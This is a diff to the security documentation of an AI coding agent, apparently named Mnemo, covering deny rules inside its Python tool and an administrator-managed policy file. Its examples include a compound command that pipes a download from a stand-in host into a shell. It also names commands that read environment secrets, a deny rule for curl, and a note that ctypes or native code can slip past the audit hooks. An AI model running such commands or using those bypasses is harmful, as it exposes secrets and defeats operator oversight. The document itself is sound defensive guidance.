@@ -45,8 +45,16 @@ in a place you can afford to lose: a container, a throwaway checkout.
   (relative to the project, and absolute), so `.env*` also covers `./.env`, `@.env`
   and `file:///…/.env`. It does not understand every way to say the same thing
   (`printenv`, `cat /proc/self/environ`, `python -c`, a script that was written
-  first), and it does not reach into the Python tool (`ipy_run`). Deny what you
-  mind, not just one spelling of it, and use `default` mode when it matters.
+  first). Deny what you mind, not just one spelling of it, and use `default` mode
+  when it matters.
+- **Deny rules reach inside the Python tool.** While a cell runs, a command it starts
+  (`subprocess`, `os.system`, `os.exec*`, `os.spawn*`, `pty.spawn`) is tested against
+  the `bash` deny rules, a file it opens against the `read` or `write`/`edit` ones, and
+  a file it removes, renames or links against the `write`/`edit` ones; a refusal is a
+  `PermissionError` in the cell. Nothing in an approved cell asks again: only deny
+  rules apply. A guarded action from a thread the cell left running after it finished
+  is refused. This uses Python's audit hooks, so code written to get around it
+  (`ctypes`, a native extension) can.
 - **`allow` rules and "always" grants end on a word and never cover a compound
   command.** `git status*` does not cover `git statusx` or `git status; curl evil | sh`,
   and an approval of `rm -rf dist` covers exactly that command. A path `allow` is
@@ -99,6 +107,37 @@ in a place you can afford to lose: a container, a throwaway checkout.
   gate fails closed, never open.
 - **A sub-agent follows the mode you pick while it runs**: switching to `plan`
   reaches children that are already working.
+
+### Managed policy, for teams
+
+An administrator can set a policy that the user's own settings and a project cannot
+widen, in a file only an administrator writes: `/etc/mnemo/managed.json` on Linux,
+`/Library/Application Support/Mnemo/managed.json` on macOS, `%ProgramData%\Mnemo\managed.json`
+on Windows. No variable or flag moves it. Precedence is managed, then the user's
+`permissions.json`, then a folder's `.pi/`.
+
+```json
+{
+  "rules": [{ "tool": "bash", "pattern": "curl *", "action": "deny" }, { "tool": "write", "action": "ask" }],
+  "modes": ["default", "accept-edits", "plan"],
+  "models": ["anthropic/*", "openai/gpt-5*"],
+  "mcpServers": ["github"]
+}
+```
+
+- `rules` are tested before the user's: a managed `deny` holds everywhere, Python cells
+  included, and a managed `ask` asks even in `yolo` and after an "always" grant (in
+  `mnemo -p`, where nobody can answer, an ask is still allowed).
+- `modes` are the modes Mnemo may run in. A mode left out is refused at start-up, at
+  `/mode` and at the gate, falling to the strictest allowed mode no looser than it.
+- `models` are `provider/id` globs. Every request to any other model is refused before
+  it is sent, whichever path chose it (`/model`, a sub-agent, escalation, reflection).
+- `mcpServers` are the server names Mnemo may start, from anyone's `mcp.json`.
+- A file that is there and cannot be read stops every edit, command and MCP call until
+  it is fixed. `mnemo doctor` shows the policy in force.
+
+It is only as strong as the file's permissions and the user's: someone who can edit it,
+or run a different program, is not bound by it.
 
 ## What leaves your machine
 
